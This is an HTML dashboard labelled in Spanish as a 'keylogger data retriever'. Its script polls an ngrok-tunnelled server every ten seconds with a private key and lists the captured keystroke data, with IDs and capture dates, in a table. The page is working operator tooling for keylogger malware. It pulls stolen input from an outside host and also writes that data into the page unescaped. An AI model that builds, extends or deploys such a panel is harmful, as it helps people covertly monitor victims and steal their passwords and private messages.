<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="ISO-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Data Table</title>
    <style>
body {
        font-family: 'Arial', sans-serif;
        background-color: #222;
        color: #fff;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
    }

    h1 {
        font-size: 2rem;
        text-align: center;
        margin-top: 2rem;
    }

    input[type="text"] {
        width: 90%;
        padding: 0.5rem;
        box-sizing: border-box;
        border: 1px solid #444;
        border-radius: 0.3rem;
        background-color: #333;
        color: #fff;
        margin: 1rem 0;
    }

    table {
        width: 90%;
        border-collapse: collapse;
        margin-top: 2rem;
        padding: 1rem;
    }

    th, td {
        padding: 0.5rem;
        text-align: left;
        border: 1px solid #444;
    }

    th {
        background-color: #111;
    }
    </style>
</head>

<body>
    <h1> !-- Recuperador de data Keylogger --! </h1>
    <h3>URL</h3>
    <input type="text" id="ngrokURL" />
    <br>
    <h3>Clave Privada</h3>
    <input type="text" id="privateKey" value="example_hotpotato"/>
    <br>
    <br>
    <table id="apiDataTable">
        <thead>
            <tr>
                <th>ID</th>
                <th>Data</th>
                <th>Obtention Date</th>
            </tr>
        </thead>
        <tbody id="tableBody">
            <!-- Data will be displayed here -->
        </tbody>
    </table>

    <script>
        // Function to fetch data from the API and update the table
        function fetchDataAndPopulateTable() {
            var completeURL = document.getElementById("ngrokURL").value + "/data/all/query?key=" + document.getElementById("privateKey").value;
            fetch(completeURL, {
                method: "get",
                headers: new Headers({
                    "ngrok-skip-browser-warning": "69420",
                }),
            })
                .then(response => response.json())
                .then(data => {
                    // Update the table with the received data
                    const tableBody = document.getElementById('tableBody');
                    tableBody.innerHTML = ''; // Clear the existing data
                    data.forEach(item => {
                        const row = `<tr>
                            <td>${item.id}</td>
                            <td>${item.data}</td>
                            <td>${new Date(item.obtainedDate)}</td>
                        </tr>`;
                        tableBody.innerHTML += row;
                    });
                })
                .catch(error => {
                    console.error('Error fetching data: ', error);
                });
        }

        // Call the function initially and then at 10-second intervals
        fetchDataAndPopulateTable();
        setInterval(fetchDataAndPopulateTable, 10000); // 10 seconds in milliseconds
    </script>
</body>

</html>
